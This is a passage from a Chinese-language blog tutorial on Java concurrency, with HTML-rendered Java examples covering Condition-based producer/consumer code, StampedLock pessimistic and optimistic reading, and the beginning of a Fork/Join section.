            lock.lock();
            while (TIMESTAMP_POOL.size() &gt; MAX_SIZE) {
                PRODUCE_COND.await();
            }
            TaskFactory.spend(1, TimeUnit.SECONDS);
            long value = System.currentTimeMillis();
            TIMESTAMP_POOL.addLast(value);
            System.out.println(Thread.currentThread() + "-&gt;" + value);
            CONSUMER_COND.signalAll();
        } catch (InterruptedException e) {
            throw new RuntimeException(e);
        } finally {
            lock.unlock();
        }
    }

    private static void useData() {
        try {
            lock.lock();
            while (TIMESTAMP_POOL.isEmpty()) {
                CONSUMER_COND.await();
            }
            TaskFactory.spend(1, TimeUnit.SECONDS);
            long value = TIMESTAMP_POOL.removeFirst();
            System.out.println(Thread.currentThread() + "-&gt;" + value);
            PRODUCE_COND.signalAll();
        } catch (InterruptedException e) {
            throw new RuntimeException(e);
        } finally {
            lock.unlock();
        }
    }
}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="StampedLock">StampedLock</h2>
<h3 id="产生背景">产生背景</h3>
<p>ReentrantReadWriteLock使得多个读线程同时持有读锁（只要写锁未被占用），而写锁是独占的。</p>
<p>但是，读写锁如果使用不当，很容易产生<font color="red"><strong>“写饥饿”</strong></font>问题</p>
<p>比如在读线程非常多，写线程很少的情况下，很容易导致写线程“饥饿”，虽然使用“公平”策略可以一定程度上缓解这个问题，但是“公平”策略是以牺牲系统吞吐量为代价的。</p>
<h3 id="StampedLock的主要特点">StampedLock的主要特点</h3>
<ol>
<li>
<p>所有获取锁的方法，都返回一个邮戳（Stamp），Stamp为0表示获取失败，其余都表示成功；</p>
</li>
<li>
<p>所有释放锁的方法，都需要一个邮戳（Stamp），这个Stamp必须是和成功获取锁时得到的Stamp一致；</p>
</li>
<li>
<p>StampedLock是不可重入的；（如果一个线程已经持有了写锁，再去获取写锁的话就会造成死锁）</p>
</li>
<li>
<p>StampedLock有三种访问模式：</p>
<p>① Reading（读模式）：功能和ReentrantReadWriteLock的读锁类似</p>
<p>② Writing（写模式）：功能和ReentrantReadWriteLock的写锁类似</p>
<p>③ Optimistic reading（乐观读模式）：这是一种优化的读模式。</p>
<p>​	我们知道，在ReentrantReadWriteLock中，当读锁被使用时，如果有线程尝试获取写锁，该写线程会阻塞。</p>
<p>​	但是，在Optimistic reading中，即使读线程获取到了读锁，写线程尝试获取写锁也不会阻塞，这相当于对读模式的优化，但是可能会导致数据不一致的问题。</p>
<p>​	所以，<strong>当使用Optimistic reading获取到读锁时，必须对获取结果进行校验</strong>。</p>
</li>
<li>
<p>StampedLock支持读锁和写锁的相互转换</p>
<p>我们知道RRW中，当线程获取到写锁后，可以降级为读锁，但是读锁是不能直接升级为写锁的。<br>
StampedLock提供了读锁和写锁相互转换的功能，使得该类支持更多的应用场景。</p>
</li>
<li>
<p>无论写锁还是读锁，都不支持Conditon等待</p>
</li>
</ol>
<h3 id="悲观读（读锁和写锁互斥）">悲观读（读锁和写锁互斥）</h3>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">practice<span class="token punctuation">.</span>util<span class="token punctuation">.</span>lock<span class="token punctuation">.</span>stamp</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">practice<span class="token punctuation">.</span>common<span class="token punctuation">.</span></span><span class="token class-name">TaskFactory</span></span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">LinkedList</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Optional</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span></span><span class="token class-name">ExecutorService</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span></span><span class="token class-name">Executors</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span></span><span class="token class-name">TimeUnit</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span>locks<span class="token punctuation">.</span></span><span class="token class-name">StampedLock</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>stream<span class="token punctuation">.</span></span><span class="token class-name">Collectors</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>stream<span class="token punctuation">.</span></span><span class="token class-name">IntStream</span></span><span class="token punctuation">;</span>

<span class="token comment">/**
 * @author: DH
 */</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">StampedLockTest</span> <span class="token punctuation">{</span>

    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token class-name">StampedLock</span> <span class="token constant">STAMPED_LOCK</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StampedLock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token class-name">LinkedList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Long</span><span class="token punctuation">&gt;</span></span> <span class="token constant">DATA</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">LinkedList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">final</span> <span class="token class-name">ExecutorService</span> executorService <span class="token operator">=</span> <span class="token class-name">Executors</span><span class="token punctuation">.</span><span class="token function">newFixedThreadPool</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">IntStream</span><span class="token punctuation">.</span><span class="token function">rangeClosed</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span>index <span class="token operator">-&gt;</span> <span class="token punctuation">{</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>index <span class="token operator">%</span> <span class="token number">9</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token comment">// 写数据</span>
                executorService<span class="token punctuation">.</span><span class="token function">submit</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-&gt;</span> <span class="token punctuation">{</span>
                    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                        <span class="token function">write</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token punctuation">}</span>
                <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
                <span class="token comment">// 读数据</span>
                executorService<span class="token punctuation">.</span><span class="token function">submit</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-&gt;</span> <span class="token punctuation">{</span>
                    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                        <span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token punctuation">}</span>
                <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">long</span> stamp <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
        <span class="token keyword">try</span> <span class="token punctuation">{</span>
            <span class="token comment">// 获取锁，并获取时间戳</span>
            stamp <span class="token operator">=</span> <span class="token constant">STAMPED_LOCK</span><span class="token punctuation">.</span><span class="token function">readLock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">Optional</span><span class="token punctuation">.</span><span class="token function">of</span><span class="token punctuation">(</span><span class="token constant">DATA</span><span class="token punctuation">.</span><span class="token function">stream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token operator">::</span><span class="token function">valueOf</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">collect</span><span class="token punctuation">(</span><span class="token class-name">Collectors</span><span class="token punctuation">.</span><span class="token function">joining</span><span class="token punctuation">(</span><span class="token string">"、"</span><span class="token punctuation">,</span> <span class="token string">"R-"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
                    <span class="token punctuation">.</span><span class="token function">ifPresent</span><span class="token punctuation">(</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token operator">::</span><span class="token function">println</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

            <span class="token class-name">TaskFactory</span><span class="token punctuation">.</span><span class="token function">spend</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token class-name">TimeUnit</span><span class="token punctuation">.</span><span class="token constant">SECONDS</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">finally</span> <span class="token punctuation">{</span>
            <span class="token comment">// 按照时间戳释放锁</span>
            <span class="token constant">STAMPED_LOCK</span><span class="token punctuation">.</span><span class="token function">unlockRead</span><span class="token punctuation">(</span>stamp<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">write</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">long</span> stamp <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
        <span class="token keyword">try</span> <span class="token punctuation">{</span>
            stamp <span class="token operator">=</span> <span class="token constant">STAMPED_LOCK</span><span class="token punctuation">.</span><span class="token function">writeLock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">long</span> value <span class="token operator">=</span> <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">currentTimeMillis</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token constant">DATA</span><span class="token punctuation">.</span><span class="token function">addLast</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"C:"</span> <span class="token operator">+</span> value<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">finally</span> <span class="token punctuation">{</span>
            <span class="token constant">STAMPED_LOCK</span><span class="token punctuation">.</span><span class="token function">unlockWrite</span><span class="token punctuation">(</span>stamp<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="乐观读：Optimistic-reading">乐观读：Optimistic reading</h3>
<p>“Optimistic reading”的使用必须遵循以下模式：</p>
<pre class="line-numbers language-csharp" data-language="csharp"><code class="language-csharp"><span class="token class-name"><span class="token keyword">long</span></span> stamp <span class="token operator">=</span> <span class="token keyword">lock</span><span class="token punctuation">.</span><span class="token function">tryOptimisticRead</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 非阻塞获取版本信息</span>
<span class="token function">copyVaraibale2ThreadMemory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token comment">// 拷贝变量到线程本地堆栈</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">lock</span><span class="token punctuation">.</span><span class="token function">validate</span><span class="token punctuation">(</span>stamp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>              <span class="token comment">// 校验在拷贝过程中有没有排他锁抢占，如果有则悲观读</span>
    <span class="token class-name"><span class="token keyword">long</span></span> stamp <span class="token operator">=</span> <span class="token keyword">lock</span><span class="token punctuation">.</span><span class="token function">readLock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token comment">// 获取读锁</span>
    <span class="token keyword">try</span> <span class="token punctuation">{</span>
        <span class="token function">copyVaraibale2ThreadMemory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// 拷贝变量到线程本地堆栈</span>
     <span class="token punctuation">}</span> <span class="token keyword">finally</span> <span class="token punctuation">{</span>
       <span class="token keyword">lock</span><span class="token punctuation">.</span><span class="token function">unlock</span><span class="token punctuation">(</span>stamp<span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token comment">// 释放悲观锁</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token function">useThreadMemoryVarables</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token comment">// 使用线程本地堆栈里的数据进行操作</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>以下为乐观读DEMO：</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">practice<span class="token punctuation">.</span>util<span class="token punctuation">.</span>lock<span class="token punctuation">.</span>stamp</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">practice<span class="token punctuation">.</span>common<span class="token punctuation">.</span></span><span class="token class-name">TaskFactory</span></span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">ArrayList</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">List</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Optional</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span></span><span class="token class-name">ExecutorService</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span></span><span class="token class-name">Executors</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span></span><span class="token class-name">TimeUnit</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span>locks<span class="token punctuation">.</span></span><span class="token class-name">StampedLock</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>stream<span class="token punctuation">.</span></span><span class="token class-name">Collectors</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>stream<span class="token punctuation">.</span></span><span class="token class-name">IntStream</span></span><span class="token punctuation">;</span>

<span class="token comment">/**
 * 乐观读
 *
 * @author: DH
 * @date: 2022/6/12
 * @desc:
 */</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">StampedLockOptimisticTest</span> <span class="token punctuation">{</span>
    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token class-name">StampedLock</span> stampedLock <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StampedLock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Long</span><span class="token punctuation">&gt;</span></span> <span class="token constant">DATA</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">final</span> <span class="token class-name">ExecutorService</span> executorService <span class="token operator">=</span> <span class="token class-name">Executors</span><span class="token punctuation">.</span><span class="token function">newFixedThreadPool</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">IntStream</span><span class="token punctuation">.</span><span class="token function">rangeClosed</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span>index <span class="token operator">-&gt;</span> <span class="token punctuation">{</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>index <span class="token operator">%</span> <span class="token number">8</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token comment">// 写数据</span>
                executorService<span class="token punctuation">.</span><span class="token function">submit</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-&gt;</span> <span class="token punctuation">{</span>
                    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                        <span class="token function">write</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token punctuation">}</span>
                <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
                <span class="token comment">// 读数据</span>
                executorService<span class="token punctuation">.</span><span class="token function">submit</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-&gt;</span> <span class="token punctuation">{</span>
                    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                        <span class="token function">optimisticRead</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token punctuation">}</span>
                <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">optimisticRead</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token comment">// 获取锁，并获取时间戳</span>
        <span class="token keyword">long</span> stamp <span class="token operator">=</span> stampedLock<span class="token punctuation">.</span><span class="token function">tryOptimisticRead</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">// 乐观读，必须先拷贝一份数据到在方法中</span>
        <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Long</span><span class="token punctuation">&gt;</span></span> local <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        local<span class="token punctuation">.</span><span class="token function">addAll</span><span class="token punctuation">(</span><span class="token constant">DATA</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">// 检查在拷贝过程中有没有排他锁抢占，如果有则悲观读</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>stampedLock<span class="token punctuation">.</span><span class="token function">validate</span><span class="token punctuation">(</span>stamp<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            stamp <span class="token operator">=</span> stampedLock<span class="token punctuation">.</span><span class="token function">readLock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">try</span> <span class="token punctuation">{</span>
                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; 重新读取数据到本地 &gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                local<span class="token punctuation">.</span><span class="token function">clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                local<span class="token punctuation">.</span><span class="token function">addAll</span><span class="token punctuation">(</span><span class="token constant">DATA</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span> <span class="token keyword">finally</span> <span class="token punctuation">{</span>
                stampedLock<span class="token punctuation">.</span><span class="token function">unlockRead</span><span class="token punctuation">(</span>stamp<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>

        <span class="token comment">// 使用数据</span>
        <span class="token class-name">Optional</span><span class="token punctuation">.</span><span class="token function">of</span><span class="token punctuation">(</span>local<span class="token punctuation">.</span><span class="token function">stream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token operator">::</span><span class="token function">valueOf</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">collect</span><span class="token punctuation">(</span><span class="token class-name">Collectors</span><span class="token punctuation">.</span><span class="token function">joining</span><span class="token punctuation">(</span><span class="token string">"、"</span><span class="token punctuation">,</span> <span class="token string">"R-"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
                <span class="token punctuation">.</span><span class="token function">ifPresent</span><span class="token punctuation">(</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token operator">::</span><span class="token function">println</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">TaskFactory</span><span class="token punctuation">.</span><span class="token function">spend</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token class-name">TimeUnit</span><span class="token punctuation">.</span><span class="token constant">SECONDS</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">write</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">long</span> stamp <span class="token operator">=</span> stampedLock<span class="token punctuation">.</span><span class="token function">writeLock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">try</span> <span class="token punctuation">{</span>
            <span class="token keyword">long</span> value <span class="token operator">=</span> <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">currentTimeMillis</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"W-"</span> <span class="token operator">+</span> value<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token constant">DATA</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">finally</span> <span class="token punctuation">{</span>
            stampedLock<span class="token punctuation">.</span><span class="token function">unlockWrite</span><span class="token punctuation">(</span>stamp<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h1>Fork/Join框架</h1>
<ol>
<li>
<p>Fork/Join任务的原理：判断一个任务是否足够小，如果是，直接计算，否则，就分拆成几个小任务分别计算。这个过程可以反复“裂变”成一系列小任务。</p>
</li>
<li>
<p>基于工作窃取算法（work-stealing）</p>
</li>
<li>
<p>Fork/Join机制可能只能在单个jvm上运行</p>
</li>
</ol>
<h2 id="RecursiveTask：有返回">RecursiveTask：有返回</h2>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name">RecursiveTask</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">V</span><span class="token punctuation">&gt;</span></span> <span class="token keyword">extends</span> <span class="token class-name">ForkJoinTask</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">V</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>实验demo : 1~10000 求和</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span></span><span class="token class-name">ExecutionException</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span></span><span class="token class-name">ForkJoinPool</span></span><span class="token punctuation">;</span>
